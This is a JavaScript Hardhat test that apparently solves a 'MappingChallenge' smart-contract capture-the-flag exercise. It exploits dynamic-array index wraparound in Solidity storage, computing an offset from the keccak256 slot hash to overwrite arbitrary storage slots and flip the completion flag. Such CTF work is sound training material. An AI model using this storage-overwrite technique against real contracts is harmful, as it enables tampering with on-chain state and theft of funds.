import { expect } from "chai"
import { ethers } from "hardhat"

describe("mapping", function () {
  it("should overflow dynamic array", async function () {
    const chalAddr = ""

    const chalName = "MappingChallenge"
    const chal = await ethers.getContractAt(chalName, chalAddr)

    const mapSlot = ethers.utils.keccak256(
      ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32))
    const offset = 2n**256n - BigInt(mapSlot)
    const invalidSlot = 2n
    const expectedVal = 0x31337

    const tx1 = await chal.set(offset+invalidSlot, expectedVal)
    await tx1.wait()

    const testVal = await chal.provider.getStorageAt(chalAddr, invalidSlot)
    expect(parseInt(testVal)).to.equal(expectedVal)

    const tx2 = await chal.set(offset, 1)
    await tx2.wait()

    expect(await chal.isComplete()).to.be.true
  })
})